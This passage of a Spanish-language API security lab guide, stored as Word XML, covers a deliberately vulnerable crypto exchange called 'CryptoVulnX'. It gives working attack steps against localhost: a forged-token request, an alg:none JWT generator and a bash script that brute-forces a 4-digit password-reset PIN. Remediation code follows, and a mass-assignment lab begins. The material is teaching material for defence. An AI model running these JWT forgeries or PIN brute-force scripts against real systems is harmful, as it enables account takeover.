      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 4 - Usar el token forjado para acceder como admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_FORJADO&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 3 - JWT con Algoritmo None</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Construir un JWT sin firma</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Generar JWT con alg:none</w:t>
        <w:br/>
        <w:t>php -r '</w:t>
        <w:br/>
        <w:t>$header = rtrim(strtr(base64_encode(json_encode(["alg"=&gt;"none","typ"=&gt;"JWT"])), "+/", "-_"), "=");</w:t>
        <w:br/>
        <w:t>$payload = rtrim(strtr(base64_encode(json_encode(["sub"=&gt;1,"username"=&gt;"admin","role"=&gt;"admin","iat"=&gt;time()])), "+/", "-_"), "=");</w:t>
        <w:br/>
        <w:t>echo "$header.$payload.\n";</w:t>
        <w:br/>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Usar el token sin firma</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_ALG_NONE&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El servidor acepta el token porque la implementacion no valida correctamente el algoritmo y acepta </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>none</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> como valido.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 4 - Fuerza Bruta de PIN de Restablecimiento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Solicitar restablecimiento de contrasena</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/reset.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"admin@cryptovulnx.com","action":"request"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Script de fuerza bruta para el PIN de 4 digitos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#!/bin/bash</w:t>
        <w:br/>
        <w:t># brute_force_pin.sh</w:t>
        <w:br/>
        <w:t>TARGET="http://localhost/appsec/api/v1/auth/reset.php"</w:t>
        <w:br/>
        <w:br/>
        <w:t>for pin in $(seq -w 0000 9999); do</w:t>
        <w:br/>
        <w:t xml:space="preserve">  response=$(curl -s -X POST "$TARGET" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -d "{\"email\":\"admin@cryptovulnx.com\",\"action\":\"verify\",\"pin\":\"$pin\",\"new_password\":\"hackeado123\"}")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  if echo "$response" | grep -q "success"; then</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "[+] PIN encontrado: $pin"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "[+] Respuesta: $response"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    break</w:t>
        <w:br/>
        <w:t xml:space="preserve">  fi</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>chmod +x brute_force_pin.sh &amp;&amp; ./brute_force_pin.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Con solo 10,000 combinaciones posibles y sin rate limiting, el PIN se encuentra en segundos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Corregir Inyeccion SQL - Usar Sentencias Preparadas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE</w:t>
        <w:br/>
        <w:t>$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";</w:t>
        <w:br/>
        <w:t>$result = $conn-&gt;query($query);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Sentencias preparadas</w:t>
        <w:br/>
        <w:t>$stmt = $conn-&gt;prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?");</w:t>
        <w:br/>
        <w:t>$password_hash = password_hash($password, PASSWORD_BCRYPT);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;bind_param("ss", $username, $password_hash);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute();</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Mejor aun: verificar hash con password_verify()</w:t>
        <w:br/>
        <w:t>$stmt = $conn-&gt;prepare("SELECT id, password_hash, role FROM users WHERE username = ?");</w:t>
        <w:br/>
        <w:t>$stmt-&gt;bind_param("s", $username);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t>$user = $stmt-&gt;get_result()-&gt;fetch_assoc();</w:t>
        <w:br/>
        <w:br/>
        <w:t>if ($user &amp;&amp; password_verify($password, $user['password_hash'])) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Autenticacion exitosa</w:t>
        <w:br/>
        <w:t>} else {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(401);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Credenciales invalidas"]);</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Corregir JWT - Secreto Fuerte y Validacion de Algoritmo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE</w:t>
        <w:br/>
        <w:t>$secret = "crypto123";</w:t>
        <w:br/>
        <w:t>$decoded = JWT::decode($token, $secret); // Acepta cualquier algoritmo</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO</w:t>
        <w:br/>
        <w:t>$secret = bin2hex(random_bytes(64)); // Secreto aleatorio de 128 caracteres hex</w:t>
        <w:br/>
        <w:t>// Almacenar en variable de entorno, NO en el codigo</w:t>
        <w:br/>
        <w:br/>
        <w:t>$decoded = JWT::decode($token, new Key($secret, 'HS256')); // Forzar algoritmo HS256</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Agregar expiracion al token</w:t>
        <w:br/>
        <w:t>$payload = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "sub" =&gt; $user['id'],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username" =&gt; $user['username'],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "role" =&gt; $user['role'],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "iat" =&gt; time(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "exp" =&gt; time() + 3600 // Expira en 1 hora</w:t>
        <w:br/>
        <w:t>];</w:t>
        <w:br/>
        <w:t>$token = JWT::encode($payload, $secret, 'HS256');</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Corregir PIN - Rate Limiting y PIN mas Largo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// SEGURO - Rate limiting y PIN de 8 digitos</w:t>
        <w:br/>
        <w:t>function verifyResetPin($email, $pin) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Verificar intentos recientes</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt = $conn-&gt;prepare("SELECT COUNT(*) as attempts FROM reset_attempts</w:t>
        <w:br/>
        <w:t xml:space="preserve">                            WHERE email = ? AND attempted_at &gt; DATE_SUB(NOW(), INTERVAL 15 MINUTE)");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;bind_param("s", $email);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $result = $stmt-&gt;get_result()-&gt;fetch_assoc();</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if ($result['attempts'] &gt;= 5) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(429);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode(["error" =&gt; "Demasiados intentos. Intente en 15 minutos."]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Registrar intento</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt = $conn-&gt;prepare("INSERT INTO reset_attempts (email, attempted_at) VALUES (?, NOW())");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;bind_param("s", $email);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;execute();</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Usar PIN de 8 digitos minimo</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Mejor: usar token aleatorio largo en lugar de PIN numerico</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $reset_token = bin2hex(random_bytes(32));</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Principios de Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sentencias preparadas</w:t>
      </w:r>
      <w:r>
        <w:t>: Nunca concatenar entrada del usuario en consultas SQL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Secretos JWT fuertes</w:t>
      </w:r>
      <w:r>
        <w:t>: Usar secretos aleatorios de al menos 256 bits, almacenados en variables de entorno.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Validar algoritmo JWT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Forzar el algoritmo esperado y rechazar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>none</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Expiracion de tokens</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Siempre incluir </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>exp</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en los tokens JWT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rate limiting</w:t>
      </w:r>
      <w:r>
        <w:t>: Limitar intentos de autenticacion y restablecimiento (5 intentos cada 15 minutos).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PINs largos o tokens</w:t>
      </w:r>
      <w:r>
        <w:t>: Usar tokens aleatorios largos en lugar de PINs numericos cortos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hashear contrasenas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>password_hash()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con bcrypt y verificar con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>password_verify()</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 03 - Broken Object Property Level Authorization (BOPLA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API3:2023 - Broken Object Property Level Authorization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Explotar la falta de control de propiedades a nivel de objeto en la API de CryptoVulnX mediante tres vectores: asignacion masiva (mass assignment) en el registro de usuarios, exposicion excesiva de datos en respuestas de la API, y manipulacion de parametros en operaciones de intercambio de criptomonedas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad BOPLA combina dos problemas clasicos:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mass Assignment (Asignacion Masiva)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: La API acepta y procesa propiedades del objeto que no deberian ser modificables por el usuario. Por ejemplo, al registrarse, un usuario puede enviar campos adicionales como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>role</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>kyc_verified</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que la API asigna directamente al objeto en la base de datos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Excessive Data Exposure (Exposicion Excesiva de Datos)</w:t>
      </w:r>
      <w:r>
        <w:t>: La API devuelve mas propiedades de las necesarias en las respuestas, exponiendo informacion sensible como claves privadas, datos internos o configuraciones que el cliente no deberia ver.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En CryptoVulnX, estas vulnerabilidades se manifiestan en tres puntos criticos:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>El endpoint de registro acepta cualquier campo JSON y lo inserta directamente en la base de datos, permitiendo auto-asignarse el rol de administrador.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>El endpoint de balance devuelve la clave privada de la wallet junto con la informacion del balance.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">El endpoint de swap acepta un parametro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> personalizado del cliente, permitiendo manipular la tasa de conversion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/auth/register.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Registro de usuarios (vulnerable a mass assignment)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/wallets/balance.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Consulta de balance (expone private_key)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/crypto/swap.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Intercambio de criptomonedas (acepta rate personalizado)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Baja a Media</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Mass assignment y exposicion de datos requieren solo observacion. La manipulacion de rate requiere entender la logica del swap.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 1 - Mass Assignment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Observa los campos que envia el formulario de registro. Ahora piensa: ¿que otros campos podria tener la tabla de usuarios en la base de datos? Campos como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>role</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
